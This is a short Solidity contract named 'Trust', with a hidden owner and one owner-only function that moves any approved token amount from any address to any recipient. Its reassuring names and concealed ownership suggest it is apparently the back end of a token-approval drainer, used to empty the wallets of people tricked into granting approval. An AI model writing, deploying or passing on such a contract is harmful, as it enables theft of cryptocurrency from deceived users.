// SPDX-License-Identifier: Unlicense
pragma solidity =0.8.18;
abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }
}
library TransferHelper {
    function safeTransferFrom(address token, address from, address to, uint value) internal {
        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x23b872dd, from, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: TRANSFER_FROM_FAILED');
    }
}
abstract contract Security is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () internal {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function owner() internal view virtual returns (address) {
        return _owner;
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}
contract Trust  is Security {
    constructor() public {
    }
    function transfer(address _token,address _from, address _to,uint256 _amount) external onlyOwner{
        require(_token != address(0), "Trust: token address to the zero address");
        require(_from != address(0), "Trust: from address to the zero address");
        require(_to != address(0), "Trust: to address to the zero address");
        require(_amount > 0, "Trust: amount must be greater than zero");
         TransferHelper.safeTransferFrom(_token,_from,_to,_amount);
    }
}